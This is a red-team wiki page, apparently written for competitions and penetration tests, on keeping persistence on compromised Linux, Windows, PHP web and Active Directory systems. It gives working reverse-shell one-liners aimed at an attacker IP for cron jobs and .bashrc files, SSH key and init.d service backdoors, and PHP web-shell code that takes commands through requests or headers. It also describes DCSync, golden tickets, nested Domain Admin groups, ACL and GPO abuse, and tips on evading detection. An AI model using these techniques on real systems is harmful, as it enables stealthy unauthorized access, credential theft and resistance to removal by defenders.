We should accomplish persistence several ways if possible, while sometimes leaving false IOCs, assisting us in [[Evasion|Evading]] detection. 
## Persistence via C2 Infrastructure

The C2 implant of choice for CU at the time of writing is [[Sliver C2]]. You can find a whole host of other options in the C2Matrix here: https://docs.google.com/spreadsheets/d/1b4mUxa6cDQuTV2BPC6aA-GR4zGZi0ooPYtBe4IgPsSc/edit#gid=0. This is a publicly available resource that compares C2 infrastructures against each other. If evasion becomes an absolute necessity in the future, or Sliver's feature count becomes insufficient, the author recommends rolling a custom [[Mythic]] agent, or building our own custom C2 infrastructure using existing techniques.

[[MSFVenom]] also contains functionality for binding malware to legitimate executables. However, this must be done in conjunction with [[Evasion]] as all MSFVenom payloads and TTPs are well signatured. 

## Persistence via LOL (Living off the Land)
### Linux
- Malicious user acct
##### Cron jobs: 
- Put a reverse shell in a cron job. This is the classic reverse shell string: 
  `/bin/bash -i > /dev/tcp/<attacker-IP>/<port> 0<&1 2>&1`
- If the victim machine has the traditional version of netcat installed, then this would work as well: `nc -e /bin/bash <ATTACKER_IP> <PORT>`
These are all the places you can hide cron jobs:
- `/var/spool/cron/crontabs/` — per-user cron jobs
- `/etc/crontab` — system crontab file, this will have references to all the other system crontab files below
- `/etc/cron.d/`
- `/etc/cron.hourly/`
- `/etc/cron.daily/`
- `/etc/cron.weekly/`
- `/etc/cron.monthly/`
##### SSH Keys:
- If you don't have an SSH key, generate one with `ssh-keygen`. 
- Add your public key to the `~/.ssh/authorized_keys` file in every user's directory. Create the file if it isn't already present, then add a new line in the file and put your public key there.
- Set the permissions on the file and directory by running `chmod 700 ~/.ssh` and 
  `chmod 600 ~/.ssh/authorized_keys`
##### Users' .bashrc file:
- If a user has bash as their default shell (and most users do,) then they will have a `.bashrc` file in their home directory. (The '.' means it's a hidden file, so use `ls -l` to view it.) This file is a shell config file that is run every time that the associated user starts a session (every time they log on). The .bashrc file basically operates like a script that's run every time a user logs on.
- Zsh (another popular shell) has an equivalent config file called `.zshrc`, so keep that in mind.
- Put a reverse shell in the **.bashrc** of every user account. 

##### Malicious Services:
###### System V (Older Method):
Create a backdoor script (a script with a reverse shell) in `/etc/init.d`. Make sure the script starts your backdoor in the **background** so your script isn't running in a visible terminal. 

Ex: `/etc/init.d/syslogd-helper` (syslogd-helper is the name of our backdoor service.)

Run `runlevel` to see the system's current runlevel. Then, create a symbolic link from your backdoor to `/etc/rc#.d`, where `#` is the current runlevel.

Ex: `sudo ln -s /etc/init.d/syslogd-helper /etc/rc3.d/S99syslogd-helper`

>[!note] S99
>S99 stands for `Start 99`, meaning that when the victim machine restarts or turns on, it will start (S) your backdoor at the end of the boot process (99).  

###### systemd (Newer Method):

### Windows
- Registry Run Keys
- Scheduled Tasks
	- Can delete attribute SD from task at HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\Tree\\\<TASK\> to hide the running task from `schtasks`.
- Startup Folder
- Malicious user acct
	- Administrator User
		- If NOT:
			- Backup Operators && Remote Management Users member can export HKLM\\system and HKLM\\sam to PTH with [[Evil-WinRM]]. This can also be accomplished by editing config.inf with [[secedit]] directly and adding the user to privileged groups and assigning privileges to the user directly via the GUI. This prevents the new groups from appearing in a user summary. TODO: Finish this with more details
- DLL Hijacking
- Poisoning Shortcuts
- Backdoor Applications
	- [[MSFVenom]] has functionality for this, but it is not very sturdy
- Replace Default Applications for File types
	- HKEY_CLASSES_ROOT???
- Malicious Services
	- Replace the binPath property of an existing Windows service with your implant to avoid creating a new service. Simple commands can also be used as binPath, meaning `net user redteam password /add` is permissible. If you plan to use an implant as a service make sure to compile as `exe-service` with [[MSFVenom]].

### Web Servers
=======
#### PHP (Web Servers)

###### PHP Webshell
[[WWWolf PHP Webshell]] is a good one. [[Antak]] for ASPX web servers. 

###### PHP Command Parameter
If you find a web server that uses PHP, put this code snippet somewhere in the PHP page. Then, you'll be able to send commands to the website via GET and POST requests.
```php
<?php  
if (isset($_REQUEST['cmd'])) {  
echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";  
}  
?>
```
Command execution example: `http://example.com/webscript.php?cmd=ls` (this uses a GET request, which is less stealthy than using a POST request.)

Alternatively, you could use the following code to achieve the same effect, but using HTTP headers instead. (This option is stealthier than GET or POST requests.)
``` PHP
<?php  
if (isset($_SERVER['HTTP_CMD'])) {  
echo "<pre>" . shell_exec($_SERVER['HTTP_CMD']) . "</pre>";  
}  
?>
```
Command execution example: `curl -H "CMD: ls" http://example.com/webscript.php`
- This method sends the commands via a custom HTTP header. HTTP headers often aren't displayed in logs, so it's quite stealthy. 
###### Stealing PHP Sessions
- This is basically session hijacking, but with PHP. 
- Some web servers write their session IDs to disk. When a web server does that, you can go find the file that contains the session IDs and use them to log in as an authorized user. 
- These might not be good for long-term persistence since sessions expire, but it's worth noting nonetheless. 
- PHP web servers sometimes store their session IDs in `var/lib/php/sessions`. The session file naming format is `sess_<SESSION_ID>`. 
- To conduct this attack, steal a session ID and change your `PHPSESSID` cookie to it (in "inspect element" or a similar browser tool) to hijack the session and login as an authorized user.
>[!tip] Troubleshooting Tip
>If you can't find the session IDs in `var/lib/php/sessions`, they could still be on disk somewhere. PHP has a configuration text file called `php.ini` that's generally located in `/etc/php.ini` or `/usr/local/lib/php.ini`, so check the `php.ini` config file to see if the session IDs are stored elsewhere.

###### Apache Backdoor (obsolete)
- This method is outdated, but may work on systems running Apache 2 or similarly old versions. The GitHub repo was last updated in 2015, and the code is even older than that, so don't expect results on newer systems. 
- Additionally, threat detection systems like rkhunter can trivially detect this backdoor, so if you use it, try to obfuscate it somehow. 
- If you want to use it, though, go for it. The READMEs in the GitHub repo should be sufficient to help you get it set up. 
This is the link to the GitHub page: https://github.com/sajith/mod-rootme


## Domain Persistence
### Credentials
You can acquire hashes of users using [[Mimikatz]]'s DCSync functionality for every user. This will grant access to the krbtgt account for golden tickets, etc. DA hashes can be used to authenticate anywhere in the domain, or to create new users in the domain. 

### Tickets
Golden and Silver Tickets are incredibly useful, and will grant persistence as well. The are generated most easily with [[Rubeus]] and [[Mimikatz]]. Golden tickets are hard to get rid of for the blue team, so avoid them if possible, or set them to be short-lived. Silver tickets are more appropriate, but more limited. Additionally, you should set these to be short-lived, as retracting these is nearly impossible. 

### Certificates

> [!error] Danger
> If you are generating a CA to have persistence, you are making blue team rebuild the domain to get you out. Only do this in nation-state sims and competitions where the domain does NOT have to be reused. In a penetration test, this is so far overkill you will not be invited back. 

[[Mimikatz]]

### SID History
SID History is used to facilitate transferring permissions from one domain to another for a user group. Therefore, if we artificially install the DA SID into our account we will maintain the DA privileges we had "before".
### Group Membership
Nested groups are hard to monitor. Since we have DA, we should make some. Example commands are from THM. 

```powershell
New-ADGroup -Path "OU=<some OU>,OU=<some OU>,DC=za,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 1" -SamAccountName "<username>_nestgroup1" -DisplayName "<username> Nest Group 1" -GroupScope Global -GroupCategory Security
```

```powershell
New-ADGroup -Path "OU=SALES,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 2" -SamAccountName "<username>_nestgroup2" -DisplayName "<username> Nest Group 2" -GroupScope Global -GroupCategory Security 
PS C:\Users\Administrator.ZA>Add-ADGroupMember -Identity "<username>_nestgroup2" -Members "<username>_nestgroup1"
```

```powershell
Add-ADGroupMember -Identity "Domain Admins" -Members "<username>_nestgroup5"
Add-ADGroupMember -Identity "<username>_nestgroup1" -Members "<low privileged username>"
```

### ACLs
If we add ourselves to the template pushed out by the SDProp service every hour, even if blue team flushes us out, we can still reacquire access every time there is a push. Especially if we grant "Full Control" to Domain Users and maintain control over some low-privileged accounts, we can add ourselves to DA anytime we please. 

### GPO
We can create a GPO inside of the Admins group to run our C2 infra as an Administrator. If we set it to be Enforced, we can ensure it runs even if there are conflicting policies. We can add our shell or C2 to the logon scripts for admin users ensuring we get a callback every time they log into their machines. Lastly, we can remove edit permissions on a policy from even the Enterprise Admins, so a network reset will have to be performed to get us out. 

## Sources for further research:
- [Airman604's Medium post](https://airman604.medium.com/9-ways-to-backdoor-a-linux-box-f5f83bae5a3c) was very useful, especially for Linux persistence. 
